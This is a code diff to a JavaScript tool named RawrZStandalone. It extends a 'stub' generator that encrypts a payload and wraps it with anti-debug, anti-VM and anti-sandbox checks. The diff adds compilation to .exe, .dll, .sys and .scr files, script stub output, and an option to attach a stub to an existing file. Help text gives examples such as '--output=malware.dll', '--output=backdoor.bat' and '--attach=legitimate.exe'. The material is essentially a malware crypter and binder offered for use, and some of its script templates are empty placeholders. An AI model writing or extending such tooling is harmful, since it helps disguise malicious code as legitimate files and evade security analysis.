@@ -1266,7 +1266,12 @@ class RawrZStandalone {
                     console.log('[ERROR] Usage: stub <target> [options]');
                     console.log('[INFO] Target: file path or URL to create stub for');
                     console.log('[INFO] Options: --type=native|dotnet, --framework=cpp|asm|csharp, --encryption=aes256|aes128|chacha20');
-                    console.log('[INFO] Example: stub C:\\Windows\\calc.exe --type=native --framework=cpp');
+                    console.log('[INFO] Output: --output=filename.ext (direct executable generation)');
+                    console.log('[INFO] Attach: --attach=target.ext (attach stub to existing file)');
+                    console.log('[INFO] Supported Extensions: .exe, .dll, .sys, .scr, .com, .bat, .cmd, .ps1, .vbs, .js');
+                    console.log('[INFO] Example: stub C:\\Windows\\calc.exe --type=native --framework=cpp --output=stub.exe');
+                    console.log('[INFO] Example: stub payload.bin --attach=legitimate.exe --type=native');
+                    console.log('[INFO] Example: stub script.ps1 --output=malware.dll --type=dotnet');
                     return;
                 }
                 const target = commandArgs[0];
@@ -1300,9 +1305,17 @@ class RawrZStandalone {
             const antiVM = options.antiVM !== false;
             const antiSandbox = options.antiSandbox !== false;
             const outputPath = options.output || null;
+            const attachTo = options.attach || null;
 
             console.log(`[OK] Generating ${stubType} stub for: ${target}`);
             console.log(`[OK] Framework: ${framework}, Encryption: ${encryptionMethod}`);
+            
+            if (attachTo) {
+                console.log(`[OK] Attaching stub to: ${attachTo}`);
+            }
+            if (outputPath && outputPath.endsWith('.exe')) {
+                console.log(`[OK] Direct .exe generation: ${outputPath}`);
+            }
 
             if (stubType === 'native') {
                 return await this.generateNativeStub(target, {
@@ -1311,7 +1324,8 @@ class RawrZStandalone {
                     antiDebug,
                     antiVM,
                     antiSandbox,
-                    outputPath
+                    outputPath,
+                    attachTo
                 });
             } else if (stubType === 'dotnet') {
                 return await this.generateDotNetStub(target, {
@@ -1320,7 +1334,8 @@ class RawrZStandalone {
                     antiDebug,
                     antiVM,
                     antiSandbox,
-                    outputPath
+                    outputPath,
+                    attachTo
                 });
             } else {
                 throw new Error(`Unsupported stub type: ${stubType}`);
@@ -1333,7 +1348,7 @@ class RawrZStandalone {
 
     async generateNativeStub(target, options) {
         try {
-            const { framework, encryptionMethod, antiDebug, antiVM, antiSandbox, outputPath } = options;
+            const { framework, encryptionMethod, antiDebug, antiVM, antiSandbox, outputPath, attachTo } = options;
             
             // Read target file
             let targetData;
@@ -1359,20 +1374,38 @@ class RawrZStandalone {
                 throw new Error(`Unsupported native framework: ${framework}`);
             }
 
-            // Save stub file
-            const filename = outputPath || `stub_${Date.now()}.${framework === 'cpp' ? 'cpp' : 'asm'}`;
-            const filepath = path.join(this.uploadDir, filename);
-            await fs.writeFile(filepath, stubCode);
-
-            console.log(`[OK] Native stub generated: ${filename}`);
-            console.log(`[OK] Compilation instructions:`);
-            if (framework === 'cpp') {
-                console.log(`[OK] g++ -o stub.exe ${filename} -lwinmm -lpsapi`);
+            // Handle different output scenarios
+            if (outputPath && this.isValidExtension(outputPath, 'executable')) {
+                // Direct executable generation
+                const exePath = path.join(this.uploadDir, outputPath);
+                await this.compileStubToExe(stubCode, framework, exePath);
+                console.log(`[OK] Direct executable generated: ${outputPath}`);
+                return { success: true, filename: outputPath, framework, encryptionMethod, type: 'executable' };
+            } else if (outputPath && this.isValidExtension(outputPath, 'script')) {
+                // Script generation
+                const scriptPath = path.join(this.uploadDir, outputPath);
+                await this.generateScriptStub(stubCode, framework, scriptPath);
+                console.log(`[OK] Script stub generated: ${outputPath}`);
+                return { success: true, filename: outputPath, framework, encryptionMethod, type: 'script' };
+            } else if (attachTo) {
+                // Attach stub to existing file
+                const attachedPath = path.join(this.uploadDir, `attached_${Date.now()}${path.extname(attachTo)}`);
+                await this.attachStubToFile(stubCode, framework, attachTo, attachedPath);
+                console.log(`[OK] Stub attached to file: attached_${Date.now()}${path.extname(attachTo)}`);
+                return { success: true, filename: `attached_${Date.now()}${path.extname(attachTo)}`, framework, encryptionMethod, type: 'attached' };
             } else {
-                console.log(`[OK] nasm -f win64 ${filename} -o stub.obj`);
-                console.log(`[OK] link stub.obj /subsystem:console /entry:main`);
+                // Save source code
+                const filename = outputPath || `stub_${Date.now()}.${framework === 'cpp' ? 'cpp' : 'asm'}`;
+                const filepath = path.join(this.uploadDir, filename);
+                await fs.writeFile(filepath, stubCode);
 
-            return { success: true, filename, framework, encryptionMethod, size: stubCode.length };
+                console.log(`[OK] Native stub generated: ${filename}`);
+                console.log(`[OK] Compilation instructions:`);
+                const compileCmd = this.getCompilationCommand(framework, 'stub.exe');
+                console.log(`[OK] ${compileCmd}`);
+
+                return { success: true, filename, framework, encryptionMethod, size: stubCode.length, type: 'source' };
+            }
         } catch (error) {
             console.log(`[ERROR] Native stub generation failed: ${error.message}`);
             return { success: false, error: error.message };
@@ -1623,6 +1656,197 @@ execute_payload:
     ret`;
     }
 
+    async compileStubToExe(stubCode, framework, outputPath) {
+        try {
+            const tempSourcePath = path.join(this.uploadDir, `temp_${Date.now()}.${framework === 'cpp' ? 'cpp' : 'asm'}`);
+            await fs.writeFile(tempSourcePath, stubCode);
+            
+            if (framework === 'cpp') {
+                // Compile C++ to executable
+                const compileCmd = `g++ -o "${outputPath}" "${tempSourcePath}" -lwinmm -lpsapi -static-libgcc -static-libstdc++`;
+                await execAsync(compileCmd);
+            } else if (framework === 'asm') {
+                // Compile Assembly to executable
+                const objPath = tempSourcePath.replace('.asm', '.obj');
+                const compileCmd1 = `nasm -f win64 "${tempSourcePath}" -o "${objPath}"`;
+                const compileCmd2 = `link "${objPath}" /subsystem:console /entry:main /out:"${outputPath}"`;
+                await execAsync(compileCmd1);
+                await execAsync(compileCmd2);
+            }
+            
+            // Clean up temp files
+            await fs.unlink(tempSourcePath).catch(() => {});
+            if (framework === 'asm') {
+                await fs.unlink(tempSourcePath.replace('.asm', '.obj')).catch(() => {});
+            }
+            
+            console.log(`[OK] Compiled to: ${path.basename(outputPath)}`);
+        } catch (error) {
+            console.log(`[WARN] Compilation failed: ${error.message}`);
+            console.log(`[INFO] Source code saved, manual compilation required`);
+        }
+    }
+
+    async attachStubToFile(stubCode, framework, targetFile, outputPath) {
+        try {
+            // Read the target file
+            const targetData = await this.readAbsoluteFile(targetFile);
+            
+            // Create a combined file with stub + target
+            const combinedData = Buffer.concat([
+                Buffer.from(stubCode),
+                Buffer.from('\n\n// === ATTACHED FILE ===\n'),
+                targetData
+            ]);
+            
+            await fs.writeFile(outputPath, combinedData);
+            console.log(`[OK] Stub attached to: ${path.basename(targetFile)}`);
+        } catch (error) {
+            console.log(`[ERROR] File attachment failed: ${error.message}`);
+            throw error;
+        }
+    }
+
+    getSupportedExtensions() {
+        return {
+            'executable': ['.exe', '.dll', '.sys', '.scr', '.com'],
+            'script': ['.bat', '.cmd', '.ps1', '.vbs', '.js'],
+            'source': ['.cpp', '.c', '.asm', '.cs', '.py'],
+            'binary': ['.bin', '.dat', '.raw', '.payload']
+        };
+    }
+
+    isValidExtension(filename, category = 'all') {
+        const extensions = this.getSupportedExtensions();
+        const ext = path.extname(filename).toLowerCase();
+        
+        if (category === 'all') {
+            return Object.values(extensions).flat().includes(ext);
+        }
+        
+        return extensions[category] && extensions[category].includes(ext);
+    }
+
+    async generateScriptStub(stubCode, framework, scriptPath) {
+        try {
+            const ext = path.extname(scriptPath).toLowerCase();
+            let scriptContent = '';
+            
+            switch (ext) {
+                case '.bat':
+                case '.cmd':
+                    scriptContent = `@echo off
+REM RawrZ Generated Stub
+REM Framework: ${framework}
+REM Timestamp: ${new Date().toISOString()}
+
+echo Starting stub execution...
+REM Stub code would be embedded here
+REM ${stubCode.substring(0, 100)}...
+
+REM Execute payload
+goto :eof`;
+                    break;
+                case '.ps1':
+                    scriptContent = `# RawrZ Generated PowerShell Stub
+# Framework: ${framework}
+# Timestamp: ${new Date().toISOString()}
+
+Write-Host "Starting stub execution..." -ForegroundColor Green
+
+# Stub code would be embedded here
+# ${stubCode.substring(0, 100)}...
+
+# Execute payload
+return`;
+                    break;
+                case '.vbs':
+                    scriptContent = `' RawrZ Generated VBScript Stub
+' Framework: ${framework}
+' Timestamp: ${new Date().toISOString()}
+
+WScript.Echo "Starting stub execution..."
+
+' Stub code would be embedded here
+' ${stubCode.substring(0, 100)}...
+
+' Execute payload
+WScript.Quit`;
+                    break;
+                case '.js':
+                    scriptContent = `// RawrZ Generated JavaScript Stub
+// Framework: ${framework}
+// Timestamp: ${new Date().toISOString()}
+
+console.log("Starting stub execution...");
+
+// Stub code would be embedded here
+// ${stubCode.substring(0, 100)}...
+
+// Execute payload
+process.exit(0);`;
+                    break;
+                default:
+                    scriptContent = stubCode;
+            }
+            
+            await fs.writeFile(scriptPath, scriptContent);
+            console.log(`[OK] Script stub created: ${path.basename(scriptPath)}`);
+        } catch (error) {
+            console.log(`[ERROR] Script generation failed: ${error.message}`);
+            throw error;
+        }
+    }
+
+    getCompilationCommand(framework, outputPath) {
+        const ext = path.extname(outputPath).toLowerCase();
+        const baseName = path.basename(outputPath, ext);
+        
+        switch (ext) {
+            case '.exe':
+                if (framework === 'cpp') {
+                    return `g++ -o "${outputPath}" source.cpp -lwinmm -lpsapi -static-libgcc -static-libstdc++`;
+                } else if (framework === 'asm') {
+                    return `nasm -f win64 source.asm -o source.obj && link source.obj /subsystem:console /entry:main /out:"${outputPath}"`;
+                }
+                break;
+            case '.dll':
+                if (framework === 'cpp') {
+                    return `g++ -shared -o "${outputPath}" source.cpp -lwinmm -lpsapi -static-libgcc -static-libstdc++`;
+                } else if (framework === 'asm') {
+                    return `nasm -f win64 source.asm -o source.obj && link source.obj /dll /subsystem:windows /entry:DllMain /out:"${outputPath}"`;
+                }
+                break;
+            case '.sys':
+                if (framework === 'cpp') {
+                    return `g++ -shared -o "${outputPath}" source.cpp -lntoskrnl -static-libgcc -static-libstdc++`;
+                }
+                break;
+            case '.scr':
+                if (framework === 'cpp') {
+                    return `g++ -o "${outputPath}" source.cpp -lwinmm -lpsapi -static-libgcc -static-libstdc++`;
+                }
+                break;
+            case '.com':
+                if (framework === 'asm') {
+                    return `nasm -f bin source.asm -o "${outputPath}"`;
+                }
+                break;
+            case '.bat':
+                return `echo @echo off > "${outputPath}" && echo REM Generated stub >> "${outputPath}"`;
+            case '.cmd':
+                return `echo @echo off > "${outputPath}" && echo REM Generated stub >> "${outputPath}"`;
+            case '.ps1':
+                return `echo "# Generated PowerShell stub" > "${outputPath}"`;
+            case '.vbs':
+                return `echo 'Generated VBScript stub' > "${outputPath}"`;
+            case '.js':
+                return `echo "// Generated JavaScript stub" > "${outputPath}"`;
+            default:
+                return `# Custom compilation for ${ext} extension`;
+        }
+    }
+
     generateDotNetStubCode(encryptedPayload, encryptionMethod, antiDebug, antiVM, antiSandbox) {
         const payloadData = JSON.stringify(encryptedPayload);
         
@@ -1718,6 +1942,9 @@ namespace RawrZStub
         console.log('    Options: --type=native|dotnet, --framework=cpp|asm|csharp');
         console.log('    Encryption: --encryption=aes256|aes128|chacha20');
         console.log('    Anti-analysis: --antiDebug, --antiVM, --antiSandbox');
+        console.log('    Output: --output=filename.ext (direct generation)');
+        console.log('    Attach: --attach=target.ext (attach to existing file)');
+        console.log('    Extensions: .exe, .dll, .sys, .scr, .com, .bat, .cmd, .ps1, .vbs, .js');
         console.log('');
         console.log('[ENCODING]');
         console.log('  base64encode <input> - Base64 encode data');
@@ -1773,6 +2000,9 @@ namespace RawrZStub
         console.log('  node rawrz-standalone.js math "2 + 2 * 3"');
         console.log('  node rawrz-standalone.js stub C:\\Windows\\calc.exe --type=native --framework=cpp');
         console.log('  node rawrz-standalone.js stub https://example.com/file.exe --type=dotnet --encryption=aes256');
+        console.log('  node rawrz-standalone.js stub payload.bin --output=malware.dll --type=native');
+        console.log('  node rawrz-standalone.js stub script.ps1 --output=backdoor.bat --type=native');
+        console.log('  node rawrz-standalone.js stub payload.exe --attach=legitimate.exe --type=native');
         console.log('');
         console.log('Total Commands: 102+ Security Features');
         console.log('File Input Support: URLs, Local files, Absolute paths, Home directory');
